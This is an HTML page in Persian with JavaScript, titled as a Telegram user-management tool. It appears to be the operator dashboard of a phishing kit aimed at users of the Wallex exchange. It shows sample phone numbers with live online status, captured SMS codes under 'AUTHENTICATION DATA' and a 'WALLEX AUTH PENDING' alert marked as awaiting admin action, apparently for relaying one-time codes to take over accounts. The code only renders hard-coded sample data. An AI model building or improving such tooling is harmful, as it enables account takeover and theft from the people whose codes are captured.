<!doctype html>
<html lang="fa" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>پیام‌های ساده تلگرام - مدیریت کاربران متعدد</title>
    <style>
      body {
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        max-width: 1200px;
        margin: 0 auto;
        padding: 20px;
        direction: rtl;
        background: #f8f9fa;
      }

      .header {
        text-align: center;
        background: linear-gradient(135deg, #007bff, #6610f2);
        color: white;
        padding: 20px;
        border-radius: 12px;
        margin-bottom: 30px;
      }

      .users-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
        gap: 20px;
        margin: 20px 0;
      }

      .user-card {
        background: white;
        border-radius: 8px;
        padding: 15px;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        border-left: 4px solid #dee2e6;
      }

      .user-card.online {
        border-left-color: #28a745;
      }

      .user-card.inactive {
        border-left-color: #ffc107;
      }

      .user-card.offline {
        border-left-color: #dc3545;
      }

      .user-card.network-issue {
        border-left-color: #6f42c1;
      }

      .telegram-message {
        background: #f8f9fa;
        border: 1px solid #dee2e6;
        border-radius: 6px;
        padding: 12px;
        font-family: "Courier New", monospace;
        font-size: 13px;
        line-height: 1.4;
        direction: ltr;
        text-align: left;
        white-space: pre-line;
        margin-top: 10px;
      }

      .user-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 10px;
        padding-bottom: 8px;
        border-bottom: 1px solid #dee2e6;
      }

      .user-phone {
        font-weight: bold;
        font-size: 16px;
      }

      .user-status {
        font-size: 18px;
        font-weight: bold;
      }

      .status-summary {
        background: white;
        padding: 20px;
        border-radius: 8px;
        margin: 20px 0;
        text-align: center;
      }

      .status-counts {
        display: flex;
        justify-content: center;
        gap: 30px;
        margin: 15px 0;
      }

      .status-count {
        text-align: center;
      }

      .status-number {
        font-size: 24px;
        font-weight: bold;
        margin-bottom: 5px;
      }

      .status-label {
        font-size: 12px;
        color: #6c757d;
      }

      button {
        background: #007bff;
        color: white;
        border: none;
        padding: 8px 16px;
        border-radius: 6px;
        cursor: pointer;
        margin: 5px;
        font-size: 12px;
      }

      button:hover {
        background: #0056b3;
      }

      .controls {
        text-align: center;
        margin: 20px 0;
      }
    </style>
  </head>
  <body>
    <div class="header">
      <h1>📱 مدیریت ساده کاربران تلگرام</h1>
      <p>نمایش بهینه برای کنترل هم��مان کاربران متعدد</p>
    </div>

    <div class="status-summary">
      <h3>📊 خلاصه وضعیت کاربران</h3>
      <div class="status-counts">
        <div class="status-count">
          <div class="status-number" style="color: #28a745" id="onlineCount">
            5
          </div>
          <div class="status-label">🟢 آنلاین</div>
        </div>
        <div class="status-count">
          <div class="status-number" style="color: #ffc107" id="inactiveCount">
            3
          </div>
          <div class="status-label">🟡 غیرفعال</div>
        </div>
        <div class="status-count">
          <div class="status-number" style="color: #dc3545" id="offlineCount">
            2
          </div>
          <div class="status-label">🔴 آفلاین</div>
        </div>
        <div class="status-count">
          <div class="status-number" style="color: #6f42c1" id="networkCount">
            1
          </div>
          <div class="status-label">📵 مشکل شبکه</div>
        </div>
      </div>
    </div>

    <div class="controls">
      <button onclick="generateUsers()">🔄 تولید کاربران نمونه</button>
      <button onclick="simulateActivity()">⚡ شبیه‌سازی فعالیت</button>
      <button onclick="clearUsers()">🧹 پاک کردن</button>
    </div>

    <div id="usersContainer" class="users-grid"></div>

    <script>
      // Sample user data
      const sampleUsers = [
        {
          phone: "09123456789",
          status: "online",
          time: "5s",
          step: "waiting_admin",
          codes: ["123456", "789123"],
        },
        {
          phone: "09987654321",
          status: "inactive",
          time: "2m",
          step: "waiting_admin",
          codes: ["456789"],
        },
        {
          phone: "09111222333",
          status: "offline",
          time: "15m",
          step: "phone_verification",
          codes: [],
        },
        {
          phone: "09444555666",
          status: "online",
          time: "1s",
          step: "waiting_admin",
          codes: ["111222", "333444", "555666"],
        },
        {
          phone: "09777888999",
          status: "network-issue",
          time: "30m",
          step: "waiting_admin",
          codes: ["777888"],
        },
        {
          phone: "09123123123",
          status: "inactive",
          time: "5m",
          step: "waiting_admin",
          codes: ["123123", "456456"],
        },
        {
          phone: "09456456456",
          status: "online",
          time: "10s",
          step: "waiting_admin",
          codes: ["789789"],
        },
        {
          phone: "09789789789",
          status: "offline",
          time: "1h",
          step: "completed",
          codes: [],
        },
      ];

      // Generate simple Telegram message
      function generateSimpleMessage(user) {
        const statusMap = {
          online: { emoji: "🟢", text: "ONLINE" },
          inactive: { emoji: "🟡", text: "INACTIVE" },
          offline: { emoji: "🔴", text: "OFFLINE" },
          "network-issue": { emoji: "📵", text: "OFFLINE" },
        };

        const status = statusMap[user.status];
        const now = new Date();
        const timeStr = now.toLocaleTimeString("fa-IR", {
          hour: "2-digit",
          minute: "2-digit",
        });
        const dateStr = now.toLocaleDateString("fa-IR", {
          month: "2-digit",
          day: "2-digit",
        });

        let message = `🟡 **WALLEX AUTH** PENDING 📋
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
📱 **${user.phone}**
🕐 ${dateStr} ${timeStr} • 3m 20s
${status.emoji} **${status.text}** • ${user.time}`;

        if (user.codes.length > 0) {
          message += `\n\n🔐 **AUTHENTICATION DATA:**
**Phone/SMS:** ${user.codes.map((code, i) => `${i + 1}.\`${code}\``).join(" - ")}`;
        }

        if (user.step === "waiting_admin") {
          message += `\n\n⏳ **در انتظار عمل ادمین...**`;
        }

        return message;
      }

      // Generate users display
      function generateUsers() {
        const container = document.getElementById("usersContainer");
        container.innerHTML = "";

        sampleUsers.forEach((user) => {
          const userCard = document.createElement("div");
          userCard.className = `user-card ${user.status}`;

          const statusMap = {
            online: "🟢 آنلاین",
            inactive: "🟡 غیرفعال",
            offline: "🔴 آفلاین",
            "network-issue": "📵 مشکل شبکه",
          };

          userCard.innerHTML = `
                    <div class="user-header">
                        <div class="user-phone">${user.phone}</div>
                        <div class="user-status">${statusMap[user.status]}</div>
                    </div>
                    <div class="telegram-message">${generateSimpleMessage(user)}</div>
                `;

          container.appendChild(userCard);
        });

        updateStatusCounts();
      }

      // Update status counts
      function updateStatusCounts() {
        const counts = {
          online: 0,
          inactive: 0,
          offline: 0,
          "network-issue": 0,
        };

        sampleUsers.forEach((user) => {
          counts[user.status]++;
        });

        document.getElementById("onlineCount").textContent = counts.online;
        document.getElementById("inactiveCount").textContent = counts.inactive;
        document.getElementById("offlineCount").textContent = counts.offline;
        document.getElementById("networkCount").textContent =
          counts["network-issue"];
      }

      // Simulate activity
      function simulateActivity() {
        // Randomly change some user statuses
        const statuses = ["online", "inactive", "offline", "network-issue"];

        sampleUsers.forEach((user) => {
          if (Math.random() < 0.3) {
            // 30% chance to change status
            user.status = statuses[Math.floor(Math.random() * statuses.length)];
            user.time = Math.floor(Math.random() * 60) + "s";
          }
        });

        generateUsers();
      }

      // Clear users
      function clearUsers() {
        document.getElementById("usersContainer").innerHTML = "";
        document.getElementById("onlineCount").textContent = "0";
        document.getElementById("inactiveCount").textContent = "0";
        document.getElementById("offlineCount").textContent = "0";
        document.getElementById("networkCount").textContent = "0";
      }

      // Initialize
      window.addEventListener("load", () => {
        generateUsers();
      });
    </script>
  </body>
</html>
